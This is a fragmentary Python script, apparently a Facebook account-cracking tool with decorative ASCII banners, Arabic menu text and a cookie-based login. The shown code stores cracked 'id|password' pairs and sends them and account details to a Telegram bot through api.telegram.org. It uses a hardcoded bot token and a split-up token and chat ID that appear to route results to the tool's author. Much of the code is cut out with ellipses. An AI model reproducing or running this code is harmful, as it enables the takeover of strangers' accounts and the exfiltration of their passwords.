...
SDMX="""
	...
	\x1b[38;5;153m \x1b[38;5;117m \x1b[38;5;196m	   ──────────────────────────────────────────────────────
─██████████████─████████████───██████──────────██████─
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─██▒▒██████████████▒▒██─
─██▒▒██████████─██▒▒████▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██─────────██▒▒██──██▒▒██─██▒▒██████▒▒██████▒▒██─
...
i='6796184537:AAGXcio2tlyvIKemy5VO5muBQnOARfK1SJM'
...
╚═════╝░╚═════╝░╚═╝░░░░░╚═╝    
 ...
 ''')
    print('')
    print(a34+'══'*25)
    print(a17+'╰─ 1. Crack Publik ➪ من الاصدقاء ')
    print(a24+'--'*25)
    print(a17+'╰─ 0. login out ➪ تغيير الكوكيز     ')
    print(a34+'══'*25)
...
(🏴༒🔱 نمــࢪود 🔱༒)  𖣬 :『@M_T_F  』⏎
					...
					akun.append(idf+'|'+pw)
					cp+=1
					requests.get("https://api.telegram.org/bot"+str(token+i)+"/sendMessage?chat_id="+str(ID+d)+"&text="+str(statuscp))
				break
...
\n(🏴༒🔱 نمــࢪود 🔱༒)  𖣬 \n:『@M_T_F 』⏎'\n\n\t\t\t\t\t
					...
					requests.get("https://api.telegram.org/bot"+str(token+i)+"/sendMessage?chat_id="+str(ID+d)+"&text="+str(statusok))
					cek_SDMVIP(kuki)
					break
...
\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
\n(🏴༒🔱 نمــࢪود 🔱༒)  𖣬 \n:『@M_T_F 』⏎'''
					requests.get("https://api.telegram.org/bot"+str(token+i)+"/sendMessage?chat_id="+str(ID+d)+"&text="+str(infoakun))
